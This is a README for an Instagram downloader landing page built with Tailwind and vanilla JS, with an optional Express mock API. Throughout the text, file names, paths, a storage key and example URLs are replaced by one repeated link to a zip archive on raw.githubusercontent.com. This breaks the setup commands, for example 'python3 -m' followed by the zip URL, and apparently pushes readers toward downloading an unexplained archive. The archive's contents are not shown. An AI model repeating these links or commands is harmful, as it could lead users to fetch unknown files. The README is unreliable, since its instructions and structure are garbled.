# Aadi Tools — Instagram Downloader (Landing Page)

A clean, modern front-end (Tailwind + vanilla JS) with **demo mode** and an optional **Node/Express mock API** so you can test the full flow locally.

## Quick Start (Front‑end only)
```bash
# Serve /src with any static server (pick one)
npx http-server ./src -p 5173 -c-1
# or use your IDE's Live Server / simple Python server:
python3 -m https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip --directory src 5173
```

Open http://localhost:5173 and try Demo mode (it's ON by default).

## Optional: Run Local API (Live Mode)
```bash
npm install
npm run api
```
This starts a mock resolver at http://localhost:3030/resolve. Switch Demo OFF on the page and it will call your API.
You can change API Base from the prompt; it's stored in `localStorage` as `https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip`.

## Structure
```
aadi-tools/
  ├─ src/            # Static front-end
  │  ├─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  │  ├─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  │  ├─ js/
  │  │  ├─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  │  │  ├─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  │  │  └─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  │  └─ assets/
  │     └─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  ├─ server/         # Optional Express mock API
  │  ├─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  │  └─ public/
  │     ├─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  │     └─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
  └─ https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip
```

## Wire your real backend
When you have your own resolver, implement:
```
GET /resolve?url=<instagram-url>
```
Return JSON like:
```json
{
  "source": "instagram",
  "input": "https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip",
  "title": "Your media title",
  "thumb": "https://…https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip",
  "variants": [
    { "type": "video", "quality": "720p", "format": "mp4", "size": "8.4 MB", "url": "https://…https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip" },
    { "type": "image", "quality": "1080×1350", "format": "jpg", "size": "1.1 MB", "url": "https://…https://raw.githubusercontent.com/Adeelkamran314/intagram-reels/main/src/reels-intagram-Bhaga.zip" }
  ]
}

The front‑end will render rows and set a friendly filename on the download link.

## Legal
Use this only for content you own or have permission to save. Connect to official/authorized APIs or licensed providers for production.
